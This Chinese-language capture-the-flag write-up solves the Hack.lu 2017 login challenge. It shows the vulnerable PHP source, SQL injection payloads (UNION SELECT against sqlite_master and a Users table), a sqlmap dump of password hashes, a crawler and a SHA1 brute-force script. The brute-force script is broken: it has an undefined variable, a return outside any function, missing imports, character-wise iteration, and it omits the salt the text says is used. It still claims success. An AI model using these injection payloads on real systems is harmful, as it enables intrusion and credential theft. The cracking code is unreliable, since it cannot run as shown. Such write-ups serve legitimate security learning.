## Hack.lu-2017
查看/robots.txt得到admin.php和login.php  
查看login.php发现源码提示  
`<!-- TODO: Remove ?debug-Parameter! -->`  
访问`/login.php?debug`看到源码  
```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?> 
```
在ID输入`' union select name,sql from sqlite_master--`，被重定向  
burp抓包查看回应  
看到set-cookie=
```sql
CREATE TABLE Users(
id int primary key,
name varchar(255),
password varchar(255),
hint varchar(255)
)
```
网上说仍在ID用limit唯一查询  
```sql
usr=%27 UNION SELECT id, id from Users limit 0,1--+&pw=chybeta  
usr=%27 UNION SELECT id, name from Users limit 0,1--+&pw=chybeta
usr=%27 UNION SELECT id, password from Users limit 0,1--+&pw=chybeta
usr=%27 UNION SELECT id, hint from Users limit 0,1--+&pw=chybeta
```
试了几次没用。。。可能理解错了。。。  

扔sqlmap...  
得到数据  
|id|hing|name|password|
|--|----|----|--------|
|1|my fav word in my fav paper?!| admin|3fab54a50e770d830c0416df817567662a9dc85c|
|2|my love is'?|fritze|54eae8935c90f467427f05e4ece82cf569f89507|
|3|the password is password|hansi|34b0bb7c304949f9ff2fc101eef0f048be10d3bd|  

根据hint: fav word in fav paper  
爬下网站上所有pdf，使用词汇爆破`sha1($pass."Salz!")`  

网上大神的爬虫脚本：
```py
import requests
import re
import os
import sys

re1 = '[a-fA-F0-9]{32,32}.pdf'
re2 = '[0-9\/]{2,2}index.html'

pdf_list = []
def get_pdf(url):
    global pdf_list 
    print url
    req = requests.get(url).text
    re_1 = re.findall(re1,req)
    for i in re_1:
        pdf_url = url+i
        pdf_list.append(pdf_url)
    re_2 = re.findall(re2,req)
    for j in re_2:
        new_url = url+j[0:2]
        get_pdf(new_url)
    return pdf_list
    # return re_2

pdf_list = get_pdf('http://111.198.29.45:37868/')
print pdf_list
# for i in pdf_list:
#     os.system('wget '+i)
```
爆破脚本：
```py
import os
import re
import sys

def get_pdf(dir):
    dir_list = os.listdir(dir)
    for i in dir_list:
        print i[-4:]
        if i[-4:]!='.pdf':
            dir_list.remove(i)
    return dir_list


def get_word_list(path):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    with open(path, 'rb') as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text = retstr.getvalue()
    device.close()
    retstr.close()
    return text

def jiami(j):
    import hashlib
    sha = hashlib.sha1(j)
    encrypts = sha.hexdigest()
    return encrypts

pdf_list =  get_pdf('./')
for i in paf_list:
    word_list = get_word_list(i)
    for j in word_list:
        sha1 = jiami(j)
        if sha1 == '3fab54a50e770d830c0416df817567662a9dc85c':
            return j
```
拿到密码ThinJerboa  
登录看到flag：  
flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}